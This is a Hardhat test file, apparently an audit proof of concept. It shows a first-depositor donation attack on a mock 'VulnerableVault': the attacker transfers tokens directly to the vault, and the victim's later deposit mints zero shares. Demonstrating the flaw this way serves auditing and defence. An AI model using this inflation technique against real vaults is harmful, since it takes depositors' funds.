import { expect } from "chai";
import { ethers } from "hardhat";

describe("AG-VLT-01: Vault Bridge Inflation Attack", function () {
  it("Should prove first-depositor donation vulnerability", async function () {
    const [attacker, victim] = await ethers.getSigners();
    
    const Token = await ethers.getContractFactory("MockERC20");
    const token = await Token.deploy();
    await token.waitForDeployment();

    const Vault = await ethers.getContractFactory("VulnerableVault");
    const vault = await Vault.deploy(await token.getAddress());
    await vault.waitForDeployment();

    // 1. Attacker donates directly to vault (bypassing deposit)
    await token.mint(attacker.address, ethers.parseEther("10000"));
    await token.transfer(await vault.getAddress(), ethers.parseEther("10000"));

    // 2. Victim deposits standard amount
    const victimDeposit = ethers.parseEther("100");
    await token.mint(victim.address, victimDeposit);
    await token.connect(victim).approve(await vault.getAddress(), victimDeposit);
    await vault.connect(victim).deposit(victimDeposit, victim.address);

    // 3. Assert victim lost everything (0 shares minted)
    const victimShares = await vault.balanceOf(victim.address);
    console.log("VULNERABILITY CONFIRMED: Victim received " + ethers.formatEther(victimShares) + " shares");
    expect(victimShares).to.equal(0n);
  });
});
